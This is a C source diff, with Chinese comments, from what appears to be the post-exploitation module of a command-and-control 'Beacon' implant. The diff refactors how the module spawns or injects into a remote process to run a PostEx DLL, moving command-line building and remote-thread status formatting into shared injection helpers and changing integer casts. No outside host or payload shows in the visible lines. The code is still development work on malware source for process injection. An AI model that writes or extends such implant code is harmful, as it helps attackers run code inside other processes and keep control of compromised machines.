@@ -23,17 +23,11 @@ BOOL PostExRemoteCompleted(PostExJob* job)
             snapshot.stage == POSTEX_STAGE_CANCELLED);
 }
 
-/* 构造 PostEx spawn 命令行，保留 exe 路径引号以兼容空格路径。 */
+/* 构造 PostEx spawn 命令行：委托给共用工具 InjectBuildSpawnCommandLine。 */
 BOOL PostExBuildSpawnCommandLine(const CHAR* exe_path, const CHAR* args,
                                  CHAR* out, SIZE_T out_size)
 {
-    if (!exe_path || !exe_path[0] || !out || out_size == 0) return FALSE;
-    if (args && args[0]) {
-        return _snprintf_s(out, out_size, _TRUNCATE,
-                           "\"%s\" %s", exe_path, args) > 0;
-    }
-    return _snprintf_s(out, out_size, _TRUNCATE,
-                       "\"%s\"", exe_path) > 0;
+    return InjectBuildSpawnCommandLine(exe_path, args, out, out_size);
 }
 
 /* 初始化传给远程 PostEx 模块的配置块。 */
@@ -53,40 +47,10 @@ VOID PostExFillConfig(PostExConfig* config, const WCHAR* pipe_name,
     }
 }
 
-/* 格式化远程线程状态，用于 job/status 输出和失败诊断。 */
+/* 格式化远程线程状态：委托给共用工具 InjectFormatRemoteThreadStatus。 */
 VOID PostExFormatRemoteThreadStatus(HANDLE thread, CHAR* out, SIZE_T out_size)
 {
-    DWORD wait_rc;
-    DWORD exit_code = 0;
-
-    if (!out || out_size == 0) return;
-    out[0] = '\0';
-    if (!thread) {
-        strcpy_s(out, out_size, "remote_thread=null");
-        return;
-    }
-
-    wait_rc = WaitForSingleObject(thread, 0);
-    if (wait_rc == WAIT_TIMEOUT) {
-        strcpy_s(out, out_size, "remote_thread=running");
-        return;
-    }
-    if (wait_rc == WAIT_OBJECT_0) {
-        if (GetExitCodeThread(thread, &exit_code)) {
-            _snprintf_s(out, out_size, _TRUNCATE,
-                        "remote_thread=exited:0x%08lx",
-                        (unsigned long)exit_code);
-        } else {
-            _snprintf_s(out, out_size, _TRUNCATE,
-                        "remote_thread=exited:GetExitCodeThread failed:%lu",
-                        (unsigned long)GetLastError());
-        }
-        return;
-    }
-
-    _snprintf_s(out, out_size, _TRUNCATE,
-                "remote_thread=wait_failed:%lu",
-                (unsigned long)GetLastError());
+    InjectFormatRemoteThreadStatus(thread, out, out_size);
 }
 
 /* 格式化远程配置块状态，便于判断远程模块卡在哪个阶段。 */
@@ -109,23 +73,23 @@ VOID PostExFormatRemoteConfigStatus(HANDLE process, PVOID remote_config,
         read_bytes < (SIZE_T)FIELD_OFFSET(PostExConfig, pipe_name)) {
         _snprintf_s(out, out_size, _TRUNCATE,
                     "remote_config=read_failed:%lu",
-                    (unsigned long)GetLastError());
+                    (ULONG)GetLastError());
         return;
     }
 
     if (snapshot.magic != POSTEX_CONFIG_MAGIC) {
         _snprintf_s(out, out_size, _TRUNCATE,
                     "remote_config=bad_magic:0x%08lx",
-                    (unsigned long)snapshot.magic);
+                    (ULONG)snapshot.magic);
         return;
     }
 
     _snprintf_s(out, out_size, _TRUNCATE,
                 "remote_stage=%lu remote_error=%lu control=0x%08lx cancel_reason=%lu",
-                (unsigned long)snapshot.stage,
-                (unsigned long)snapshot.last_error,
-                (unsigned long)snapshot.control_flags,
-                (unsigned long)snapshot.cancel_reason);
+                (ULONG)snapshot.stage,
+                (ULONG)snapshot.last_error,
+                (ULONG)snapshot.control_flags,
+                (ULONG)snapshot.cancel_reason);
 }
 
 /* 校验 PostEx DLL 与当前 Beacon 架构一致。 */
@@ -340,7 +304,7 @@ BOOL PostExStartSpawnRemote(const PostExStartRequest* req,
                         NULL, NULL, &si, &pi)) {
         if (err) _snprintf_s(err, err_size, _TRUNCATE,
                              "postex spawn CreateProcess failed: %lu",
-                             (unsigned long)GetLastError());
+                             (ULONG)GetLastError());
         HeapFree(GetProcessHeap(), 0, command_line_w);
         HeapFree(GetProcessHeap(), 0, pipe_name_w);
         return FALSE;
@@ -443,7 +407,7 @@ BOOL PostExStartInjectRemote(const PostExStartRequest* req,
     if (!*process) {
         if (err) _snprintf_s(err, err_size, _TRUNCATE,
                              "postex OpenProcess failed: %lu",
-                             (unsigned long)GetLastError());
+                             (ULONG)GetLastError());
         HeapFree(GetProcessHeap(), 0, pipe_name_w);
         return FALSE;
     }
@@ -712,7 +676,7 @@ BOOL PostExStartRemote(const PostExStartRequest* req,
     if (!backend || !backend->Start) {
         if (err) _snprintf_s(err, err_size, _TRUNCATE,
                              "unknown postex backend: %lu",
-                             (unsigned long)backend_kind);
+                             (ULONG)backend_kind);
         return FALSE;
     }
 
